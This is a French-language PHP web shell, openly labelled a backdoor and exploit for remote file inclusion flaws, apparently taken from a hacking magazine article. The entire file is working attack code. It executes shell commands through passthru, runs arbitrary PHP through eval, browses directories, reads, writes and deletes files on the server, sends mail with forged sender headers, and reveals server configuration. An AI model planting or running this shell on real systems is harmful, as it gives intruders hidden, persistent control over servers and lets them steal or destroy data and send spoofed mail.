<? 
print("<html><head><title>Backdoor PHP codée par rAidEn & LFL</title></head><body
bgcolor=\"white\" LINK=\"blue\" VLINK=\"blue\">");
print("<p align=\"center\"><font size=\"5\">Exploit include v1.0</font></p>");
print("<p>Ce script permet d'exploiter une faille include ou une frame mal placée de type :
www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tant que backdoor sur un serveur pour garder une porte d'entrée dérobée.<br><br>
<u>par rAidEn & LFL , article publié dans The Hackademy Journal numéro 12</u><br><br>Spécial greetz à : Crash_FR, MatraX, Elboras, papar0ot, Lostnoobs, Icarus, Xelory, L_Abbe, Daedel, DHS-team, Carlito, xdream_blue, redils,  IHC, Wanadobe.biz, #abyssal, #cod4, #hzv, #security-corp, #Revolsys, ...... et tout ceux que j'ai oublié & aussi et surtout à (feu)tim-team</p>");

/******Code source du système de remote*****/

$QS = $QUERY_STRING;
if(!stristr($QS, "separateur") && $QS!="") $QS .= "&separateur";
if(!stristr($QS, "separateur") && $QS=="") $QS .= "separateur";

/*pour les forms*********************************/
$tab = explode("&", $QS);
$i=0;
$remf = "";
while( $tab[$i] != "" && $tab[$i-1] != "separateur" )
{
    $temp = str_replace(strchr($tab[$i], "="), "", $tab[$i]);
    eval("\$temp2=\${$temp};");
    $remf .= "<input type=hidden name=" . $temp . " value=" . "'" . $temp2
."'>\n";
    $i++;
}
/*
$temp = str_replace(strchr($tab[$i], "="), "", $tab[$i]);
if($temp!="")
{
    eval("\$temp2=\${$temp};");
    $remf .= "<input type=hidden name=" . $temp . " value=" . "'" . $temp2
."'>\n";
}*/
/************************************************/


/*pour les links*********************************/
if($QS != "separateur")
    $reml = "?" . str_replace(strchr($QS, "&separateur"), "", $QS) .
"&separateur";
else $reml = "?$QS";
$adresse_locale = $reml;
/************************************************/




print("<hr>");
print("<a href=\"$adresse_locale&option=1\">Exécuter une commande dans un shell</a><br> <!-- utiliser exec($commande, $retour); -->");
print("<a href=\"$adresse_locale&option=2\">Exécuter du code PHP</a><br>");
print("<a href=\"$adresse_locale&option=3\">Lister un répertoires</a><br>");
print("<a href=\"$adresse_locale&option=4\">Gérer les fichiers</a><br>");
print("<a href=\"$adresse_locale&option=5\">Envoyer un mail</a><br>");
print("<a href=\"$adresse_locale&option=6\">Infos serveur</a><br>");
print("<a href=\"mailto:raiden_cyb@hotmail.com\">Contacter le créateur</a><br><hr>");


/* récupération des variables : la fonction $_REQUEST n'existant pas avant php 4.1.0, vous devrez alors commenter ces lignes */
$option = $_REQUEST["option"];
$rep =  $_REQUEST["rep"];
$nom =  $_REQUEST["nom"];
$option_file =  $_REQUEST["option_file"];
$cmd =  $_REQUEST["cmd"];
$code =  $_REQUEST["code"];
$msg =  $_REQUEST["msg"];
$option_mail =  $_REQUEST["option_mail"];
$destinataire =  $_REQUEST["destinataire"];
$sujet =  $_REQUEST["sujet"];
$message =  $_REQUEST["message"];

if($option == 1){
    print("<form action=\"?\"> $remf Commande : <input type=\"text\" name=\"cmd\"></form>");
    echo "<br> PS : peu de serveurs acceptent les commandes venant de PHP";
}

if($option == 2){
    print("<form action=\"?\"> $remf Code : <input type=\"text\" name=\"code\"></form>");
}

if($option == 3){
    print("<form action=\"?\"> $remf Répertoire à lister : <input type=\"text\" name=\"rep\"></form>");
    print("$rep");
}

if($option == 4){
    print("<br><form action=\"?\"> $remf");
    print("<br>Nom du fichier :<br><input type=text name=\"nom\">");
    print("<input type=hidden name=option value=$option>");
    print("<INPUT TYPE=RADIO NAME=\"option_file\" VALUE=\"mkdir\" >Créer le
fichier");
    print("<INPUT TYPE=RADIO NAME=\"option_file\" VALUE=\"edit\" >Éditer le
fichier");
    print("<INPUT TYPE=RADIO NAME=\"option_file\" VALUE=\"del\" >Supprimer le
fichier");
    print("<INPUT TYPE=RADIO NAME=\"option_file\" VALUE=\"read\" CHECKED>Lire le
fichier");
    print("<input type=submit value=Go>");
    print("</form>");
}


if($option == 5){
    print("<PRE><form action=\"?\"> $remf Destinataire : <input type=\"text\" name=\"destinataire\" size=\"80\">");
    print("<br>Provenance du mail : <input type=\"text\" name=\"provenance\" size=\"80\"><br>");
    print("Adresse de retour : <input type=\"text\" name=\"retour\" size=\"80\"><br>");
    print("Sujet : <input type=\"text\" name=\"sujet\" size=\"80\"><br>");
    print("Message : <input type=\"text\" name=\"message\"
size=\"80\"><br><input type=\"submit\" value=\"Envoyer\"></form></PRE>");
}

if($option == 6){
    echo"Nom du serveur : <a href=\"http://$SERVER_NAME\">$SERVER_NAME</a><br>
";
    echo"Adresse IP du serveur : <a href=\"http://$SERVER_ADDR\">$SERVER_ADDR</a><br> ";
    echo"Port utilisé par défault 80 : <font color=\"red\">$SERVER_PORT</font><br> ";
    echo"Mail de l' admin : <a href=\"mailto:$SERVER_ADMIN\">$SERVER_ADMIN</a><br><br>";
    
    
    echo"Racine du serveur : <font color=\"red\">$DOCUMENT_ROOT</font><br>";
    echo"Adresse menant à COMMAND.COM : <font color=\"red\">$COMSPEC</font><br>";
    echo"Path installé sur le serveur : <font color=\"red\">$PATH</font> <br>";
    echo"OS, SERVEUR, version PHP : <font color=\"red\">$SERVER_SOFTWARE</font><br><br>";
    
    echo"Version du protocole utilisé (HTTP) : <font color=\"red\">$SERVER_PROTOCOL</font><br>";
    echo"En-tête Accept du protocole HTTP : <font color=\"red\">$HTTP_ACCEPT</font><br>";
    echo"En tête User_agent du protocole HTTP : <font color=\"red\">$HTTP_USER_AGENT</font><br>";
    echo"En-tête Accept-Charset du protocole HTTP : <font color=\"red\">$HTTP_ACCEPT_CHARSET</font><br> ";
    echo"En-tête Accept-Encoding du protocole HTTP : <font color=\"red\">$HTTP_ACCEPT_ENCODING</font><br> ";
    echo"En-tête Accept-Language du protocole HTTP : <font color=\"red\">$HTTP_ACCEPT_LANGUAGE</font><br> ";
    echo"En-tête Connection du protocole HTTP : <font color=\"red\">$HTTP_CONNECTION</font><br> ";
    echo"En-tête Host du protocole HTTP : <font color=\"red\">$HTTP_HOST</font><br><br>";
    
    echo"Version de CGI : <font color=\"red\">$GATEWAY_INTERFACE</font><br> ";
    echo"Version de récupération du form : <font color=\"red\">$REQUEST_METHOD</font><br> ";
    echo"Argument de l' adresse : <font color=\"red\">$QUERY_STRING</font> <br>";
    echo"Nom du script : <font color=\"red\">$SCRIPT_NAME</font><br> ";
    echo"Chemin du script : <font color=\"red\">$SCRIPT_FILENAME</font><br> ";
    echo"Adresse entière du script : <font color=\"red\">$REQUEST_URI
</font><br>";
}

/* Commande*******/
if($cmd != "")
{
    echo "{${passthru($cmd)}}<br>";
}
/* Commande*******/


/* Exécution de code PHP**********/
if($code != ""){
    $code = stripslashes($code);
    eval($code);
}
/* Execution de code PHP**********/


/* Listing de rep******************/
if($rep != "")
{
    if(strrchr($rep, "/") != "" ||  !stristr($rep, "/")) $rep .= "/";
    $dir=opendir($rep);
    while ($file = readdir($dir)) 
    {
    	    if (is_dir("$rep/$file") && $file!='.')
	    { 
    		    echo"<li><a href=\"$adresse_locale&rep=$rep$file\">(rep) $file
</a><br>\n";
	    }elseif(is_file("$rep/$file"))
	    {
	    	    echo "<li>	<a
href=\"$adresse_locale&option_file=read&nom=$rep$file\">(file) $file</a> <a
href=\"$adresse_locale&option_file=del&nom=$rep$file\">del</a> <a
href=\"$adresse_locale&option_file=edit&nom=$rep$file\">edit</a><br>\n";
	    }
    }
}
/* Listing de rep******************/


/* Gestion des fichiers*********************/
if($option_file == "mkdir" && $nom != "")
{
    $fp = fopen($nom, "w");
    fwrite($fp, stripslashes($msg));
    print("Fichier crée/modifié");
}

if($option_file == "read" && $nom != "")
{
    $fp = fopen($nom, "r");
    $file = fread($fp, filesize($nom));
    $file = htmlentities ($file, ENT_QUOTES);
    $file = nl2br($file);
    echo "<br>$file";
}

if($option_file == "del" && $nom != "")
{
    unlink($nom);
    print("Fichier effacé");
}

if($option_file == "edit" && $nom != "")
{
    $fp = fopen($nom, "r");
    $file = fread($fp, filesize($nom));
    $file = htmlentities ($file, ENT_QUOTES);
    echo "<form action=$adresse_locale> $remf";
    echo "<TEXTAREA COLS=80 rows=25 name=msg>$file</textarea>";
    echo "<input type=hidden name=option_file value=mkdir>";
    echo "<input type=hidden name=nom value=$nom>";
    echo "<br><input type=submit value=Go> PS : les fichiers trop longs ne passent po :(";
    echo "</form>";
}
/* Gestion des fichiers*********************/


/* Envoi de mails************************/
if(($destinataire != "" ) && ($sujet != "") && ($message != "")){
    $option_mail = "From: $provenance \n";
    $option_mail .= "Reply-to: $retour \n";
    $option_mail .= "X-Mailer: Mailer by rAidEn \n";
    
    mail($destinataire, $sujet, $message, $option_mail);
    
    print("Mail envoyé a : $destinataire ...");
}
/* Envoi de mails************************/

print("</body></html>");
/*print("<noscript><script=\"");*/
?>